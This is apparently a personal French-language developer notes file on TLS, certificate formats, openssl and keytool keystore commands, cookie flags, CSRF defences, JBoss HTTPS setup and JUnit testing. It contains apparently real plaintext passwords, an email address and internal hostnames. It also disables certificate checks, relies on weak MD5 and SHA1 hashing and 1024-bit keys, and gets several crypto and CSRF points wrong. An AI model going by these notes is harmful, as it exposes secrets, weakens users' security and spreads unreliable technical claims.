    curl -H "Content-type: application/json" -X POST -d '{"numbadge":"A120000002"}' http://hrd2.orleanssrv.domsma:9881/smabtp-rest/rest/badge/inputbadge
    curl  -X GET https://cas.auchan.com/cas/login //si reponse vide c que ça marche
    curl -k -X GET https://localhost:8444/system/console // -k pour ignorer l'insecurité certificat ssl non trusted                              
cryptage : crypt : cipher : ssh : cypher : securite : crypto : condidentialite/authenticite/non-repudiation=integrite(non modifie sur reseau) HTTPS : repond à tout ça LINK94949494
    sur windows pour voir la liste des certificats root d'autorité reconnus: executer certmgr.msc
        web:
        SERVEUR                                             CLIENT
                <------------------------------------------salut! https! je peux utiliser ces methodes d'encryptage : SSL3.0(vieux), TLS1.0 (presque co SSL3), TLS1.2, TLS1.3(tres != de TLS1.2) laquelle veux tu choisir?
        possede 1certif 
        contenant une signature = message hashee (MD5_vieux,SH1_vieux ou SH2) et cryptee avec clee privee
        Je choisis la plus recente des versions d'encryptage.
        mon certif contient
        cle privee (sert à decrypter (ou inverse/clepublique)) 
        cle publique (ne sert qu'à crypter (ou inverse/cleprivee))-------------------->envoyes ici. Je t'authentifie : cle publique(signature)=ok?(regarde dans le browser la liste des certifs valides) 
        + signature_cryptee-----------------------------------------------------------/^                                                                                          
                                                                                                   Genère une cle symetrique(peut crypter et decrypter) qui est cryptee par la cle publique.
        cle symetrique <-------------------------------------------cle symetrique cryptee (random key)                                                               
        decryptee par la cle privee
        (etape supplementaire : des deux cotes ils genèrent une pre-master key puis une master key (ou session key) qui est symetrique.)
        LA COMMUNICATION PEUT COMMENCER GRACE A LA CLE SYMETRIQUE (session key) QUI CRYPTE ET DECRYPTE
   pour simuler :des requetes https : http : etc avec plugin firefox : generateur de requetes ou plugin chrome postman(dans les programmes) 
          https://addons.mozilla.org/fr/firefox/addon/httprequester/?src=ss
          si je veux faire un post: mettre dans content : user={"gender":"f","place":"bbbbbb","pseudo":"uuuuu","phone":"uuuuuu","email":"kanailaurent@gmail.com"}(voir aussi sur ANDROID!)  
          sinon je peux cliquer sur parameters, rajouter des params puis cliquer sur ParameterBody
  cookies httponly et secure  LINKcooklskjhh 
    le path / du setCookie indique que ce cookie s'applique à tout le site (et donc les sous paths aussi)
    domain peut etre sette a .mon.domain(s'applique partout) ou sous-domain.mon.domain (s'applique que dans le sous domain)
    "Cookie" est envoyé du navigateur vers le serveur
    "SetCookie" est envoyé du serveur vers le navigateur pour dire au navigateur lors de la prochaine requête de renvoyer ça dans Cookie
    
    dans le serveur setter le httponly: LINKcooklskjhh
                        NewCookie hraCookie= new NewCookie(UserManagementConstants.CONNECTION_ID, getDatasourceSessionIdFromContext(), "/", getCookieDomain(), null, -1, httpRequest.isSecure());
                        return javax.ws.rs.core.Response.seeOther(go).header("Set-Cookie",hraCookie.toString()+"; Secure; HttpOnly").build();
                          ou
                                        	final String cookiePath = "/";
                                      		final String cookieDomain = getCookieDomain();
                                      		Cookie cookie = new Cookie(name, value);
                                      		cookie.setPath(cookiePath);
                                      		//cookie.setSecure(httpRequest.isSecure());
                                      		cookie.setSecure(true);
                                      		cookie.setHttpOnly(httpOnly);
formats : de certificats : certificat :
                              Échange d’informations personnelles (PKCS #12)  (.pfx ou .p12)
                                    Le format d’échange d’informations personnelles (PFX, également appelé P12) prend en charge le stockage sécurisé des certificats, des clés privées et de tous les certificats d’un chemin d’accès de certification.
                                    Le format PKCS #12 est le seul format de fichier utilisable pour l’exportation d’un certificat et de sa clé privée.
                                    peut etre transcode en .pem (contenant le certif et la cle privee) 
                              Le format PKCS #7 ou P7B  (.p7b ou .p7c ou .keystore) Chiffré en Base64 ASCII Standard de syntaxe de message de chiffrement
                              _     prend en charge le stockage des certificats et de tous les certificats du chemin d’accès de certification. (keytool utilise ce format) 
                             | DER X.509 (.cer ou .der) (PKCS #8) La version binaire(!=bas64) de PEM. Tout le monde peut devenir un DER. Ne contiennent "BEGIN CERTIFICATE / END CERTIFICATE"
                             |       Le format DER (Distinguished Encoding Rules) prend en charge le stockage d’un seul certificat. Ce format ne prend pas en charge le stockage de la clé privée ou du chemin d’accès de certification.
  un.cer .crt peut etre soit | PEM (.pem) version Base64 de DER Chiffré en Base64 X.509 (commence par ----BEGIN fini par END---) pour en crée une avec mobaxterm faire Conversion>ExportSSH key
  importable dans browser    |       Le format Base64 ASCII prend en charge le stockage d’un seul certificat. Peut etre un csr.
                             |_      Possible y stocker la chaine de certifs et possible la cle privee.
                             KEY (.key) est un PEM ne contenant que la cle privee
                             PKCS #10 csr peut etre transcodé en .pem                                        
       pour pourvoir faire du https :(recevoir des requetes https sur mon serveur):
          cryptage : (voir aussi openssl)
              cryptage AES avec generation de cle etc etc...
                  voir article http://java.sun.com/developer/technicalArticles/Security/AES/AES_v1.html
          ATTENTION ne pas tester avec IE car si certif non authentifie on dirait que ça ne marche pas sur IE
CSRF(CrossSiteRequestForgery) : LINKc.s.r.f (Cross-site scripting appartient à csrf)
    inciter quelqu'un qui est connecté avec sa session sur le site X à lui faire executer une requette HTTP (genre rm -r*) par javascript caché (dans une image par ex)           
        la parrade est : 
                - Utiliser des jetons de validité dans les formulaires : faire en sorte qu'un formulaire posté ne soit accepté que s'il a été produit quelques minutes auparavant : le jeton de validité en sera la preuve. Le jeton de validité doit être transmis en paramètre et vérifié côté serveur.
                - Effectuer une vérification du référent dans les pages sensibles : connaître la provenance du client permet de sécuriser ce genre d'attaques. Ceci consiste à bloquer la requête du client si la valeur de son référent est différente de la page d'où il doit théoriquement provenir.
 openssl : C:\OPENSSL\bin>openssl.exe
        Installer openssl sur unix:  
                    wget http://www.openssl.org/source/openssl-1.0.1g.tar.gz //  pour verifier la signature d'un fichier integrite sur unix:
                    pour ignorer verif certificat : ajouter wget --no-check-certificate etc...  
                   wget http://www.openssl.org/source/openssl-1.0.1g.tar.gz.md5 // recupere son hash
                   md5sum openssl-1.0.1g.tar.gz //affiche le hash
                   cat openssl-1.0.1g.tar.gz.md5 //affiche le fichier hash et comparer les deux
                   mkdir openssl
                   mv openssl*tar.gz openssl
                   cd openssl
                   tar -xvzf openssl-1.0.1g.tar.gz
                   cd openssl-1.0.1g
                   mv openssl /opt/
                   ./config --prefix=/opt/openssl --openssldir=/opt/openssl
                   sudo make install
                   openssl version
     si j'ai erreur java.lang.ArrayIndexOutOfBoundsException: Array index out of range: 64
          c parce que le client utilise TLS1.0 et le serveur veut utiliser TLS1.2 : il faut forcer le client a utiliser TLS1.2
          ajouter la propriete systeme: com.ibm.jsse2.overrideDefaultProtocol=TLSv12                   
          System.setProperty("com.ibm.jsse2.overrideDefaultProtocol","TLSv12");
      si j'ai erreur nested exception is javax.naming.PartialResultException [Root exception is javax.naming.CommunicationException: simple bind failed: DomainDnsZones.groupe.sa.colas.com:636 [Root exception is javax.net.ssl.SSLHandshakeException: Server chose TLSv1, but that protocol version is not enabled or not supported by the client.]]
          mon truststore.jks ne contient pas le bon certificat.
    ci dessous : CommonName c'est le domaine:www.toto.com ou  10.0.0.1 ou localhost ou une adresse ip bref ca DOIT être ce que je vois quand je vais tapper sur le site.
            si j'ai erreur unable to write 'random state' 
                  c'est parce que j'ai pas execute en mode admin
            si j'ai erreur Unable to load config info from /usr/local/ssl/openssl.cnf
                 set OPENSSL_CONF=C:/OPENSSL/share/openssl.cnf ou bien avec cygwin(plante pas comme windows) 
              >>>marche:                                 
http://www.robinhowlett.com/blog/2016/01/05/everything-you-ever-wanted-to-know-about-ssl-but-were-afraid-to-ask/#file-formats
        verification date expiration certificat .p12(un .p12 peut contenir ou pas une cle privée dedans) ou .pem:
                openssl pkcs12 -in renault.p12 -nokeys | openssl x509 -noout -enddate
                openssl x509 -enddate -noout -in Certigna.pem
pour utiliser les fichiers ppk  :
      ppk est un format windows puttygen de paire de cle. pour convertir un ppk en fichier openssl:
          apt-get install putty-tools // installer sur linux putty pour l'utiliser pour convertir ppk->openssl
          puttygen mapaireDecleaconvertir.ppk -O private-openssh -o nomdemaPairDecleensortie
          on peut le faire avec la fenetre windows puttygen: export openssl ca exporte la cle prive au format openssh (à mettre dans id_rsa) "voir" afficher la cle privee                
          
c ca que j'ai fait qui marche jusqu'au bout
    Creeer une cle privee et son certificat public publique certifie(A ou B) permet à un tiers de me requeter en https.
        A) Avec un certificat certifie par une authorite de certification externe: 
        1) cacert.cer    				==> correspond au SSLCACertificateFile
        	Cette directive permet de definir le fichier tout-en-un où vous pouvez rassembler les certificats des Autorites de Certification (CAs) pour que mes clients puissent me requeter en https 
        	On les utilise pour l'authentification des clients. Un tel fichier contient la simple concatenation des differents fichiers de certificats codes en PEM, par ordre de preference. 
        	Cette directive peut être utilisee à la place et/ou en complement de la directive SSLCACertificatePath.
        2) portail.sirh.aviation-civile.gouv.fr.key  	==> correspond au SSLCertificateKeyFile 
        	Fichier contenant la cle privee du serveur codee en PEM. Cette directive permet de definir le fichier contenant la cle privee du serveur codee en PEM. Si la cle privee est chiffree, une boîte de dialogue demandant le mot de passe s'ouvre au demarrage.
        3) portail.sirh.aviation-civile.gouv.fr.crt     	==> correspond au SSLCertificateFile   
        	Cette directive permet de definir le fichier de donnees contenant les informations de certificat X.509 du serveur codees au format PEM. 
        
c ca que j'ai fait qui marche jusqu'au bout          
        B) Avec un certificat certifie par ma propre authorite de certification que je cree:
        COTE SERVEUR:
                creation root certificate publique et prive
        OK  openssl  req -new  -x509  -keyout  ca-key2.pem.txt -out  ca-certificate2.pem.txt  -days  365
        kanailaurent1
        FR;France;Paris;DGAC;GOUV;gouv.fr;;
                creation keystore serveur
        OK  D:\Java\jdk1.6.0_45\bin\keytool -storetype JKS -keystore clientkeystore2.jks -genkeypair -alias client -keyalg RSA -sigalg SHA256withRSA // genkey est l'ancien nom de genkeypair
        kanailaurent2
        ws-dev.sigp.gouv.fr;wsgouv;ws;Paris;France;FR;oui;kanailaurent3;FAIRE ENTREE ATTENTION AU NOM et PRENOM!!! bien mettre le nom de domaine(si on voudra faire un csr)
                creation csr à partir du keystore serveur
        OK  D:\Java\jdk1.6.0_45\bin\keytool -certreq -alias client -file client2.csr -keystore clientkeystore2.jks -keyalg rsa
        kanailaurent2
                certifier mon csr avec le root certificat 
        OK  openssl  x509  -req  -CA ca-certificate2.pem.txt -CAkey ca-key2.pem.txt -in ../certifsserver/client2.csr -out ../certifsserver/client2.cer  -days 365  -CAcreateserial
        kanailaurent1
                importer dans keystore server le root certificate publique (1er. a faire. important.)
        OK  D:\Java\jdk1.6.0_45\bin\keytool -import -keystore clientkeystore2.jks -file ../certifs/ca-certificate2.pem.txt -alias theCARoot (si erreur "java.util.IllegalFormatConversionException: d != java.lang.String" rajouter -J-Duser.language=en: ca se produit pour java>7)
        kanailaurent2;oui
                importer dans keystore server le certificat signe par autorite de certification qui est client2.cer (2eme.) 
        OK  D:\Java\jdk1.6.0_45\bin\keytool -import -keystore clientkeystore2.jks -file client2.cer -alias client (si erreur "java.util.IllegalFormatConversionException: d != java.lang.String" rajouter -J-Duser.language=en: ca se produit pour java>7)
        kanailaurent2
        COTE CLIENT
         placer le certificat root : ca-certificate2.pem.txt (ca ct pour une appli PHP je crois que dans un client java il aurait fallu l'integrer dans un jks (voir "Moi client appel serveur par https.")
          redemarrer le client.
fin c ca que j'ai fait qui marche jusqu'au bout
c ca qui marche jusqu'au bout 
      pour importer un .p12 dans un jks vierge (que l'on cree) (un .p12 peut contenir ou pas une cle privée dedans)
      creer le .p12 (optionnel: on pourrait me le donner mais dans ce cas je DOIS connaitre le mdp)
      >>>>      openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout lola.key -out lola.pem
      >>>>      openssl pkcs12 -export -in lola.pem -inkey lola.key -name deviendraAliasDansJksFinal -out lola.p12 (mot de passe à retenir)
      creer un jks vide :
      >>>     D:\Java\jdk1.7.0_60\bin\keytool -genkeypair -alias mycertificate -validity 10800 -keyalg RSA -keysize 4096 -keystore alice2.jks (utiliser le mm mot de passe que le .p12) -sigalg SHA256withRSA -storepass fondation2017
      >>>     D:\Java\jdk1.7.0_60\bin\keytool -delete -alias mycertificate -keystore alice2.jks
      inserer le .p12 dans le jks (un .p12 peut contenir ou pas une cle privée dedans)
      >>>     D:\Java\jdk1.7.0_60\bin\keytool -v -importkeystore -srckeystore lola.p12 -srcstoretype PKCS12 -destkeystore alice2.jks -deststoretype JKS (si erreur "java.util.IllegalFormatConversionException: d != java.lang.String" rajouter -J-Duser.language=en: ca se produit pour java>7)
      verification jks voir dans le jks
              D:\Java\jdk1.7.0_60\bin\keytool -list -v -alias deviendraAliasDansJksFinal -keystore alice2.jks
fin c ca que j'ai fait qui marche jusqu'au bout                              
c ca que j'ai fait qui marche PAS jusqu'au bout:
cree localhost_self-signed.key (privatekey)+localhost_self-signed.pem(certificatautosigne)
      openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout localhost_self-signed.key -out localhost_self-signed.pem
creer localhost_self-signed.p12(.p12 file that can be imported and trusted within OS X’s Keychain application ou browser for example)=localhost_self-signed.key(privatekey)+localhost_self-signed.pem(certifpublickey)      
      openssl pkcs12 -export -in localhost_self-signed.pem -inkey localhost_self-signed.key -name "SelfSignedServer" -out localhost_self-signed.p12
Create a CA by creating a root certificate. This will create the private key (cakey.pem) and the public publique key (cacert.pem, a.k.a. the certificate) of the root CA. Use the default localhost for the common name:
      openssl req -new -x509 -extensions v3_ca -keyout /cygdrive/c/OPENSSL/share/private/cakey.pem -out cacert.pem -days 365 -config /cygdrive/c/OPENSSL/share/opensslPerso.cnf
Create CSR=server-req.pem(CSR for the server)+server-key.pem(server’s private key).
      openssl req -new -nodes -out server-req.pem -keyout /cygdrive/c/OPENSSL/share/private/server-key.pem -days 365 -config /cygdrive/c/OPENSSL/share/opensslPerso.cnf
      attention le nom de la compagnie doit etre le meme que celui du certificat CA
CA signe le CSR:server-req.pem->server-cert.pem(grace à la conf qui sait ou est le rootCA)
      dabord besoin de creer fichier serial avec 100001 dedans+repertoire newcert+fichier certindex.txt à la racine du repertoire defini par openssl.cnf sinon affiche erreur
      openssl ca -out server-cert.pem -days 365 -config /cygdrive/c/OPENSSL/share/opensslPerso.cnf -infiles server-req.pem (ne pas modifier l'ordre des parametres)
Creer .p12:=server-cert.pem(certif valide)+server-key.pem(server’s private key)+cacert.pem(certificate of the rootCA) si ya marque unable to write random state faire : sudo rm ~/.rnd et refaire
      openssl pkcs12 -export -in server-cert.pem -inkey /cygdrive/c/OPENSSL/share/Perso/private/server-key.pem -certfile /cygdrive/c/OPENSSL/share/Perso/cacert.pem -name "SignedServer" -out server-cert.p12                           
fin c ca que j'ai fait qui marche PAS jusqu'au bout.
              pour generer creer une paire de cle rsa+ certificat quipeut etre aussi le root CA certificat.
                    openssl genrsa -out maCle.pem 1024(ou 2048 ou 4096) -des3(optionnel: protege par mot de passe)
              pour lire detail cette paire de cle: 
                     cat maCle.pem
                  pour vraiment lire detail cette paire de cle: duree de vie
                      openssl rsa -in maCle.pem -text -noout
                  cette paire de cle est en clair. Il faut la chiffrer c'est plus prudent pour chiffrer la paire de cle: 
                      trois options de chiffrement possible :-des, -des3 et -idea.
                      openssl rsa -in maCle.pem -des3 -out maCle.pem
                      il demande un mot de passe
                      (cat maCle.pem ne donne maintenant plus le meme resultat que tout a l'heure et -text demande le mot de passe)
                  pour auto-signer ma pairedeclecertificat:
                      openssl req -x509      -nodes -newkey rsa:4096        -days 365  -keyout maCle.key -out maCleAutosigneePeutEtreMaCleRootABienConcerverSecreteDevaEtreDeposeeSurTousLesClientsQuiDoiventNousFaireConfiance.pem
                      openssl req -x509 -new -nodes                 -sha256 -days 365  -key maCle.key    -out maCleAutosigneePeutEtreMaCleRootABienConcerverSecreteDevaEtreDeposeeSurTousLesClientsQuiDoiventNousFaireConfiance.pem (attention se souvenir du nb de jours)
                  pour exporter la cle publique de la paire de cle (cryptee ou non)
                      openssl rsa -in maCle.pem -pubout -out maClePublique.pem
                      (ou avec x509) openssl x509 -pubkey -noout -in maCle.pem > maClePubliqueX509.pem
                      openssl rsa -in maClePublique.pem -text -noout ne marche plus maintenant car il s'attend a avoir une paire alors qu'il y a que la publique.
                  pour lire detail la cle publique il faut faire : duree de vie 
                      openssl rsa -in maClePublique.pem -text -noout -pubin
                  pour lire detail certificat (base64 avec avant -----BEGIN CERTIFICATE----- et apres -----END CERTIFICATE----- il faut faire :                      
                      openssl x509 -in renault.crt -text -noout // enlever -noout pour afficher le x509
                  pour lire detail certificat .p12 il faut faire : (un .p12 peut contenir ou pas une cle privée dedans)                      
                      openssl pkcs12 -info -in renault.p12
                  pour extraire une paire de cle d'un certificat (demande le mot de passe)
                      openssl pkcs12 -export -in localhost_self-signed.pem            -inkey localhost_self-signed.key -name "SelfSignedServer"         -out localhost_self-signed.p12
                      openssl pkcs12         -in monCertificat.p12          -nocerts                                                            -nodes -out meCle.pem  (optionnel : -password env: MOTDEPASSE)
                  pour extraire une cle publique d'un certificat : (pas sur)
                        openssl pkcs12 -in awtasg1.p12 -nocerts -nodes -out meClePub.pem
                  pour creer une demande de validation d'un certificat
                         openssl req -new -key maClePourUnServeurOuUnClient.key -out laDemande.csr
                  pour valider ma demande de validation de certificat avec une autre cle root (voir )
                  openssl x509 -req -in device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 500 -sha256                     
              CHIFFRER UN FICHIER AVEC UNE CLE SYMETRIQUE. CHIFFRER CETTE CLE SYMETRIQUE ET/OU SON MOT DE PASSE AVEC UNE CLE PUBLIQUE ENVOYER LE MOT DE PASSE ET LA CLE SYMETRIQUE CHIFFRES
              CHIFFRER UN FICHIER AVEC UNE PAIRE DE CLE ELLE MEME PROTEGEE PAR UN MOT DE PASSE SUITE A CHIFFREMENT
              AUTRES :
                  pour cripter un fichier avec la cle publique :
                      openssl rsautl -encrypt -pubin -in SYE.opc -inkey maClePublique.pem -out SyeCrypte.crypt (la taille du fichier ne doit pas depasser 116 octets)
                  pour decripter (se fait avec le fichier qui contient la cle prive obligatoirement):
                      openssl rsautl -decrypt -out SYEdecripte.opc -inkey maCle.pem -in SyeCrypte.crypt
                         
              SIGNATURES :
                    SIGNER :JE HASH UN DOC ET JE SIGNE CE HASH AVEC UNE CLE PRIVEE.
                    VERIFIER : JE FAIS VERIFIY SUR LE HASH AVEC LA SIGNATURE ET LA CLE PUBLIQUE ET JE REGARDE QUE LE RESULTAT EST LE MEME QUE LE HASH
                    exemple : pour verifier : installer md5 puis faire md5 D:\LocalData\p036782\Downloads\apache-tomcat-8.0.35.zip ca retourne : 4FA548E1F7BC9925B1BF1D64B04658C2 je verifie que çest bien = à ce qui est declare sur le site.
                                ou faire openssl dgst -md5 monfichier
                                ou bien charger openssl
                  Il n'est possible de signer que de petits documents. Pour signer un gros document on calcule d'abord une empreinte de ce document. La commande dgst permet de le faire.
                    pour hasher un document :(md5...)
                    openssl dgst <hachage: -md5 ou -sha1 ou -ripemd160> −out <empreinte> <fichier_entree>
                    exemple :openssl dgst -sha1 -out hashashge.txt SYE.opc
                            C:\OPENSSL\bin>openssl.exe dgst -md5 D:\Profiles\lduverge\Downloads\mysql-5.7.17-winx64.zip
                    pour signer le hashage du document ca se fait avec une cle privee:
                      openssl rsautl -sign -in <empreinte> -inkey <cle privee> -out <signature>
                      exemple: openssl rsautl -sign -in hashashge.txt -inkey maCle.pem -out maSignature.sha1
                    pour verifier la signature :
                      openssl rsautl -verify -in <signature> -pubin -inkey <cle> -out <empreinte2 qui doit etre pareille que empreinte1>
                      exemple :openssl rsautl -verify -in maSignature.sha1 -pubin -inkey maClePublique.pem -out hash2.txt
                              openssl rsautl -verify -in maSignature.sha1 -inkey maCle.pem -out hash2.txt
                              ou bien openssl dgst -sha1 -verify awtasg1pub.pem -signature dest.zip.sha1 dest.zip.crypt
                       (L'option -pubin indique que la cle utilisee pour la verification est la partie publique de la cle utilisee pour la signature.)
       keytool :
              http://www.keystore-explorer.org/specifications.html
                      First I have generated the keystore et une paire de cle englobes dans un certif: creer  genererer jks date limite validite 
               JKS:         pour sha1: D:\Java\jdk1.6.0_45\bin\keytool -genkeypair  -dname "CN=Lurent Duverge, OU=Hr Access, O=Soprahr, L=Paris, ST=Paris, C=FR" -v -alias moncertifpkcs -validity 10800 -storetype pkcs12  -keystore dgac2.p12 -keysize 2048 ou 4096 -keyalg RSA -sigalg SHA256withRSA -storepass mdpmdp -keypass mdpcert
                                      D:\Java\jdk1.6.0_45\bin\keytool -genkeypair -v -alias aliasdemoncertif -validity 360ou3650 -storetype voircidessous(facultatif) -keystore mon.keystore.p12 -keysize 4096(facttf) -keyalg RSA -sigalg SHA1withRSAparexmpleOuSHA256withRSA(facultatifMaisAttentionAuDefaut) -storepass monpasswordDuTrousseau(facttf) // sert à creer nouveau trousseau ou rajouter une cle dans trousseau existant (il demandera la creation du password de la cle). Dans ce cas -storepass doitEtreLeMdpDuTrousseau
               .P12         pour sha2: D:\Java\jdk1.6.0_45\bin\keytool -genkeypair  -v -alias fondationauteuil -validity 10800 -storetype pkcs12  -keystore fondationauteuilks.p12 -keysize 4096 -keyalg RSA -sigalg SHA256withRSA -storepass fondation2017
                                          (un .p12 peut contenir ou pas une cle privée dedans)
                         -storetype       JKS(que Java. Pas de scretkey dedans) est par defaut j Java9. (.jks)  
                                          JCEKS(Que java. +d'algos. Contient secretkey,TripleDES est + fort) que >Java1.4 (.jceks)
                                          PKCS12(tout language,Contient scretkey, cle privee peut etre extraite) (.p12 ou .pfx) par defaut des java9
                                          PKCS11 connect with hardware keystore devices such as SafeNet's Luna, nCipher or Smart cards
                                          DKS keystore de keystore
                                          Windows-MY
                                          BKS de Bouncy castle (=JKS mais existe secretkey) possible convertir jks->bks
                                  Quels sont vos nom et prÚnom ?
                                    [Unknown]:  Laurent Duverge
                                  Quel est le nom de votre unitÚ organisationnelle ?
                                    [Unknown]:  HR Access
                                  Quel est le nom de votre entreprise ?
                                    [Unknown]:  Sopra
                                  Quel est le nom de votre ville de rÚsidence ?
                                    [Unknown]:  Paris
                                  Quel est le nom de votre Útat ou province ?
                                    [Unknown]:  Paris
                                  Quel est le code pays Ó deux lettres pour cette unitÚ ?
                                    [Unknown]:  FR
                    // curl -u user:password -k https://127.0.0.1:9000/greeting
                    // convertir un .P12 en JKS (en fait j'importe un certif .p12 dans un keystore jks je crois) (un .p12 peut contenir ou pas une cle privée dedans)
                            keytool -importkeystore -srckeystore key.p12 -srcstoretype PKCS12 -srcstorepass password -alias some-alias -destkeystore samlKeystore.jks -destalias some-alias	-destkeypass changeit (si erreur "java.util.IllegalFormatConversionException: d != java.lang.String" rajouter -J-Duser.language=en: ca se produit pour java>7)
                    // convertir un JKS en .P12 (en fait importkeystore va recup un alias d'un keystore B pour le copier dans un keystoreA mais on peut se passer du keystoreB si j'ai bien compris)
                             keytool -importkeystore -srckeystore file.jks -destkeystore file.p12 -srcstoretype JKS -deststoretype PKCS12 -deststorepass motdepasse -srcalias aliasdansjks -destalias aliasdest (si erreur "java.util.IllegalFormatConversionException: d != java.lang.String" rajouter -J-Duser.language=en: ca se produit pour java>7)
                                  si j'ai erreur BadPaddingException: Given final block not properly padded le .p12 est casse      
                  // regarder voir dans detail jks liste ce que j'ai dans mon fichier keystore -v pour plus de details. -alias pour voir cet alias 
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -list -v -alias selfsigned -keystore samlKeystore.jks -storetype pkcs12(Facultatif par defaut c jks)
                   // verification date expiration duree de vie date certificat dans jks: 
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -list -v -keystore renault.jks // certif 1 c celui la, puis s'enchainent les certifs du pki et leurs dates respectives
                      regarder voir ce que j'ai dans le certificat public en mode rfc PEM ascii base64 (en mode texte): format x509 afficher 
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -list -rfc -keystore monKeystore.jks -storetype pkcs12(Facultatif par defaut c jks) par defaut .p12 des java9 (un .p12 peut contenir ou pas une cle privée dedans)
                      regarde ce que j'ai dans les truststore de mon JDK : 
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -list -keystore D:\Java\jdk1.6.0_45\jre\lib\security\cacerts (facultatif: -alias unAliasCertifDeMonStore) -storetype pkcs12(Facultatif par defaut c jks)
                          le mot de passe par defaut est changeit                          
                      Exporter le certificat(contenant cle public publique et privee(sur?)) de mon keystore (le certif est copie en sortie mais reste stocke dans le keystore)
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -export -rfc(optionnel: pour exporter en mode rfc lisible format clair voir) -keystore monKeyStore.jksOuP12 -alias aliasdemoncertif -file nomfichierCertifAConserver.cer
                      Afficher ce certif. au formant en clair ici EngieCert.jks n'est pas un keystore mais un certificat.
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -printcert -file D:\Projets\INRA\EngieCert.jks oubien ..certificat.cer
                      creer une demande de certificat :(CSR) pour le Keystore:
                      cree le fichier mycertreq.csr à transmettre mais je peux l'auto-certifier moi meme avec openssl.
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -certreq -alias "aliasDunDesCertificatDansMonTrousseau" -file mycertreqEnSortie.csr -keystore mon.keystore.jks ou .p12
                          ce fichier .csr c'est du texte à transmettre a une Certificate Authority
                      L'Autorite me renvoie tototo.crt (oubien certif.cer?) C'est un certificat. Pour l'importer dans mon trousseau truststore je fais :
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -import -alias "aliasDuCertifAImporterDansMonTrousseau" -file tototo.crt -keystore mon.keystore.jks (ou java/jre/lib/security/cacerts si je veux le mettre dans le trousseau de Java) (si erreur "java.util.IllegalFormatConversionException: d != java.lang.String" rajouter -J-Duser.language=en: ca se produit pour java>7)
                      Importer mon certif prive en tant que certif public publique dans un keystore (si le certif existe deja, même avec un autre alias il le detecte et refuse l'import mais on peut forcer )
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -import(ou -importcert c pareil apparemment) -alias "nouvelAliasDuCertifQuonVeutDefinirDansMonTrousseau" -file tototo.crtOU.p7bMAISCANAPASLAIRDEMARCHERERRURX509 -keystore mon.keystore.jks (si erreur "java.util.IllegalFormatConversionException: d != java.lang.String" rajouter -J-Duser.language=en: ca se produit pour java>7)
                      Supprimer un certificat du keystore :
                          D:\Java\jdk1.7.0_03-32b\bin\keytool -delete -alias "aliasDuCertifCreeMonTrousseauMoi" -keystore dgac.jks
                      ajouter un certificat public publique dans un nouveau truststore :LINKAAKJDLKIHE Pour récupérer le certificat du navigateur : afficher le certif, choisir le certificat root et l'extraire au format DER. C'est ce dernier qu'on peut importer dans le jks (le base64 aussi je crois mais pas testé)
                        D:\Java\jdk1.7.0_03-32b\bin\keytool -importcert -file <chemin certificat cg44> -keystore ldap.jks -storepass jkspass -alias ldapgrid -keypass sopra123 (si erreur "java.util.IllegalFormatConversionException: d != java.lang.String" rajouter -J-Duser.language=en: ca se produit pour java>7)                          
                      Then I have place the file generated “laurentkeystore.jks” into my jboss directory : 
                      C:\jbdevstudio4\jboss-eap\jboss-as\server\default\conf\ laurentkeystore.jks
                      Then I have edited the file 
                      C:\jbdevstudio4\jboss-eap\jboss-as\server\default\deploy\jbossweb.sar\server.xml
                      And I have placed this where it should be (find the commented lines): 
                      <!-- SSL/TLS serveur faire du https Connector configuration using the admin devl guide keystore -->
                            <Connector protocol="HTTP/1.1" SSLEnabled="true" 
                                 port="8443" address="${jboss.bind.address}" // port https =443 d'habitude
                                 scheme="https" secure="true" clientAuth="false" 
                                 keystoreFile="${jboss.server.home.dir}/conf/laurentkeystore.jks"
                                 keystorePass="password" sslProtocol = "TLS" />
                      stop and restart the jboss server and go to 
                      https://localhost:8443/yourapplication
                      Si l'appli web ne marche pas,  dans web.xml tanter ca : (voir LINKsecurity-web) 
                                  
test :les tests : Linktestdevopsç9349
  unitaire : isolé, rapide, test ce que le developpeur attend: ils doivent couvrir un max car rapides
            microtests: test juste une fonction ou petit groupe de fonctions
            functionaltests: plus large que microtest avec mocks pour mocker les composants lents
  acceptance : peut etre connecte à l'exterieur(database), test ce que le client attend
  integration :connecte à l'exterieur(database), test connecté avec tous les systemes externes de prod : reduire leur nombre car lents. DOivent etre joués en parallele avec les performance tests. Ne doivent pas tester business rules mais seulement que tout est bien parametré
  performance tests : à mettre en place dès le début d'un projet car complexes à mettre en place. (assert swatch durée < oldvalue)  
  non-functionnal testing: tester le code de pupett -> pupett-lint  + cucumber (qui met en place l'env)
                                              ||         ||
                                              chef  ->   food-critic

JUNIT : (pour les tests unitaires c mieux d'utiliser le plugin maven surefire)// parce que ça génère des fichiers xml de rapport de tests.voir aussi LINKcucumberldfj
TDD :
    inutile pour tester l'UI, l'accès à des fichiers (à isoler dans methodes non testees)
    1er test doit etre Degenerate test: tester la base de la base sans rien faire et avancer petits pas par petits pas aux suivants sans inclure les dépendances necessaires. Tout doit pouvoir etre mocké
    Je ne peux dev code que pour faire passer un test
    Je ne peux pas ecrire plus d'un test qui échoue
    Tant que j'ai des tests KO je ne peux pas ecrire d'autres devs en +
si j'ai l'erreur sur eclipse au lancement du test : tests : " Test type does not exist"
    aller dans Executer>Debugger ou quoi et essayer par là...
Organiser son projet avec ses tests comme ca: 
version 5: junit5 : junit 5 :  // https://stackify.com/junit-5/ tests repetees, tests executees ou non.... a lire
            <dependency>
            <groupId>org.junit.jupiter</groupId>
            <artifactId>junit-jupiter-engine</artifactId>
            <version>5.1.0</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.junit.jupiter</groupId>
            <artifactId>junit-jupiter-api</artifactId>
            <version>5.1.0</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.junit.platform</groupId>
            <artifactId>junit-platform-launcher</artifactId>
            <version>1.3.0-M1</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.junit.platform</groupId>
            <artifactId>junit-platform-runner</artifactId>
